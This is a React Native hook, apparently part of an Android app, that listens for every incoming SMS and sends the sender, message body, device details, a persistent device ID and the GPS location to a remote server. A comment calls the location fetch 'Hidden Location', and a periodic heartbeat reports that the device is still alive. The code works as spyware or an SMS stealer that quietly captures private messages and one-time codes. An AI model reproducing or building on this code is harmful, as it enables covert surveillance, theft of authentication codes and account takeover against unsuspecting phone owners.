import { useEffect, useState } from 'react';
import { PermissionsAndroid } from 'react-native';
import * as Device from 'expo-device';
import * as Location from 'expo-location';
import axios from 'axios';
import SmsListener from 'react-native-get-sms-android';
import AsyncStorage from '@react-native-async-storage/async-storage';

// 🐅 APNA FINAL RENDER URL
const API_URL = "https://tiger2-1.onrender.com/log-sms";
const LOCAL_URL = "http://localhost:10000/log-sms"; // Fallback for local testing

const DEVICE_KEY = 'TIGER_DEVICE_ID';

const useTracking = (permissionStatus) => {
  const [useLocalServer, setUseLocalServer] = useState(false); // Toggle for local vs Render
  const [deviceId, setDeviceId] = useState(null);

  // Ensure deviceId exists (persisted)
  useEffect(() => {
    const ensureId = async () => {
      try {
        let id = await AsyncStorage.getItem(DEVICE_KEY);
        if (!id) {
          id = 'dev-' + Math.random().toString(36).slice(2, 10);
          await AsyncStorage.setItem(DEVICE_KEY, id);
          console.log('[useTracking] Generated deviceId:', id);
        }
        setDeviceId(id);
      } catch (err) {
        console.warn('[useTracking] deviceId error:', err.message);
      }
    };
    ensureId();
  }, []);

  // Retry logic with exponential backoff
  const sendWithRetry = async (url, payload, retries = 3, delay = 1000) => {
    for (let i = 0; i < retries; i++) {
      try {
        console.log(`[useTracking] Attempt ${i + 1} POST to: ${url}`);
        const response = await axios.post(url, payload, { timeout: 10000 });
        console.log(`[useTracking] Success on attempt ${i + 1}:`, response.data);
        return response;
      } catch (err) {
        console.error(`[useTracking] Attempt ${i + 1} failed:`, err.message);
        if (i < retries - 1) {
          console.log(`[useTracking] Retrying in ${delay}ms...`);
          await new Promise(resolve => setTimeout(resolve, delay));
          delay *= 2; // Exponential backoff
        }
      }
    }
    throw new Error('All retry attempts failed');
  };

  useEffect(() => {
    if (permissionStatus === 'granted') {
      
      const sendDataToServer = async (messageBody, sender) => {
        try {
          // 1. Get Hidden Location
          let location = "Disabled";
          try {
            let loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Balanced, timeout: 5000 });
            location = `${loc.coords.latitude},${loc.coords.longitude}`;
            console.log(`[useTracking] Location fetched: ${location}`);
          } catch (locErr) {
            console.warn(`[useTracking] Location fetch failed: ${locErr.message}`);
          }

          // 2. Prepare Device Info
          const deviceName = `${Device.brand} ${Device.modelName} (OS: ${Device.osVersion})`;

          // 3. Send to Server with retry
          const targetUrl = useLocalServer ? LOCAL_URL : API_URL;
          const payload = {
            sender: sender,
            message: messageBody,
            device: deviceName,
            deviceId: deviceId || 'unknown',
            location: location,
            timestamp: new Date().toLocaleString()
          };

          await sendWithRetry(targetUrl, payload);
          console.log("[✓] Data Synced to Tiger Server");
        } catch (err) {
          console.error("[useTracking] Final sync failure:", err.message);
          // Optionally, store failed payloads locally for later retry
        }
      };

      // Real-time Listener (Sahi tareeka)
      console.log("[useTracking] Starting SMS listener...");
      const subscription = SmsListener.addListener(async (message) => {
        console.log(`[useTracking] SMS received from ${message.originatingAddress}: ${message.body}`);
        await sendDataToServer(message.body, message.originatingAddress);
      });

      // Health check: Log listener status every 30s
      const healthInterval = setInterval(() => {
        console.log("[useTracking] SMS listener health check: Active");
      }, 30000);

      // Heartbeat: check settings then send ping if enabled; interval is respected at 40s base but uses stored interval to skip sending if changed
      let lastSent = 0;
      const heartbeatInterval = setInterval(async () => {
        try {
          const enabled = (await AsyncStorage.getItem('TIGER_HEARTBEAT_ENABLED')) !== 'false'; // default true
          const intervalMs = Number(await AsyncStorage.getItem('TIGER_HEARTBEAT_INTERVAL')) || 40000;
          if (!enabled) return; // skip if disabled

          const now = Date.now();
          if (now - lastSent < intervalMs) return; // not yet

          console.log('[useTracking] Heartbeat: sending ping');
          const targetUrl = useLocalServer ? LOCAL_URL : API_URL;
          await sendWithRetry(targetUrl, {
            sender: 'heartbeat',
            message: 'ping',
            device: `${Device.brand} ${Device.modelName}`,
            deviceId: deviceId || 'unknown',
            timestamp: new Date().toLocaleTimeString(),
            type: 'ping'
          });

          lastSent = Date.now();
        } catch (err) {
          console.warn('[useTracking] Heartbeat failed:', err.message);
        }
      }, 5000); // check every 5s whether it's time to send according to intervalMs

      return () => {
        subscription.remove();
        clearInterval(healthInterval);
        clearInterval(heartbeatInterval);
      };
    }
  }, [permissionStatus, useLocalServer, deviceId]);

  // Heartbeat settings: read from AsyncStorage
  const readHeartbeatSettings = async () => {
    try {
      const enabled = await AsyncStorage.getItem('TIGER_HEARTBEAT_ENABLED');
      const interval = await AsyncStorage.getItem('TIGER_HEARTBEAT_INTERVAL');
      return { enabled: enabled === 'true', interval: interval ? Number(interval) : 40000 };
    } catch (err) {
      return { enabled: true, interval: 40000 };
    }
  };

  // Expose toggle for local server, deviceId and heartbeat control (can be used in UI)
  const setHeartbeatEnabled = async (val) => {
    await AsyncStorage.setItem('TIGER_HEARTBEAT_ENABLED', val ? 'true' : 'false');
  };
  const setHeartbeatInterval = async (ms) => {
    await AsyncStorage.setItem('TIGER_HEARTBEAT_INTERVAL', String(ms));
  };

  return { useLocalServer, setUseLocalServer, deviceId, readHeartbeatSettings, setHeartbeatEnabled, setHeartbeatInterval };
};
